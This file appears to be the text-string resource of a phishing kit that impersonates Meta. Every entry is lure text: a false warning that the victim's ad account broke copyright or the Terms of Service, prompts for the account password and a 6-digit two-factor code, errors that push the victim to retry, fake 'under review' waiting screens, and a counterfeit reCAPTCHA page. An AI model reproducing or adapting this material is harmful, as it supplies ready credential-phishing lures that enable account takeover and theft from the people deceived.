form.title: Contact Forms
form.content: We have received multiple customer reports indicating that your advertisement has violated copyright regulations, which is against our advertising policies. As a result, your advertising account has been scheduled for review.
form.content_tos: Meta has received multiple reports indicating that your account may not comply with its Terms of Service and Community Standards. As a result, your account is currently under review.
form.message: Please provide us information that will help us investigate
form.agree: I agree to our Terms, Data and Cookies Policy.
form.pw_header: For your security, you must enter your password to continue.
form.two_factor_desc: You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.
form.2fa_text2: . You may need to re-enter your password.
form.2fa_text3: . If you've already set up recovery codes, you can click
form.review1: Hi, We are receiving your information
form.review2: Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account
form.review3: Please wait, this could take up to 5-10 minutes, please be patient while we review your case...

errors.business_email: *Business Email Address is not Valid. Please Enter Correct Email Address.
errors.personal_email: *Personal Email Address is not Valid. Please Enter Correct Email Address.
errors.incorrect_password: The password you've entered is incorrect.
errors.incorrect_2fa: The code generator you entered is incorrect, please try again!

captcha.title: Our systems have detected unusual traffic from your computer network
captcha.disclaimer_1: This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
captcha.disclaimer_2: We’ve used Google’s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.
captcha.disclaimer_3: reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
